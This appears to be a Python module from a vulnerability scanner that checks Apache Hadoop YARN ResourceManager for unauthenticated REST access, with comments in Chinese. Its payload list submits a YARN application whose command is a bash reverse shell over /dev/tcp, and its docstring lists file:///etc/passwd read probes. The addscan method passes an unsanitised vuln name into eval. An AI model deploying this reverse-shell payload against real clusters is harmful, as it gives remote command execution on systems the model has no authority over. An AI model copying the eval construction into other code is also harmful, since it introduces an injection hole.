#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''

    Apache Hadoop扫描类: 
        Hadoop YARN ResourceManager 未授权访问
            暂无编号
                Payload: https://vulhub.org/#/environments/hadoop/unauthorized-yarn/
file:///etc/passwd
file:///C:\Windows\System32\drivers\etc\hosts
'''

from lib.initial.config import config
from lib.tool.md5 import md5, random_md5
from lib.tool.thread import thread
from payloads.ApacheHadoop.unauth import apache_hadoop_unauthorized_scan

class ApacheHadoop():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'ApacheHadoop'
        self.md = md5(self.app_name)
        self.cmd = 'echo ' + self.md

        self.apache_hadoop_unauthorized_payloads = [
            {
                'path': 'ws/v1/cluster/apps/new-application',
                'data': ''
            },
            # {
            #     'path': 'ws/v1/cluster/apps',
            #     'data': {
            #         'application-id': '',
            #         'application-name': 'mouse',
            #         'am-container-spec': {
            #             'commands': {
            #                 'command': 'curl DNSdomain',          # * ping或curl无效, 放弃
            #             },
            #         },
            #         'application-type': 'YARN',
            #     }
            # },
            {
                'path': 'ws/v1/cluster/apps',
                'data': {
                    'application-id': '',
                    'application-name': 'mouse',
                    'am-container-spec': {
                        'commands': {
                            'command': '/bin/bash >& /dev/tcp/ip/port 0>&1',
                        },
                    },
                    'application-type': 'YARN',
                }
            },
        ]

    def addscan(self, url, vuln=None):
        if vuln:
            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))

        return [
            thread(target=self.unauth_scan, url=url)
        ]

ApacheHadoop.unauth_scan = apache_hadoop_unauthorized_scan

hadoop = ApacheHadoop()
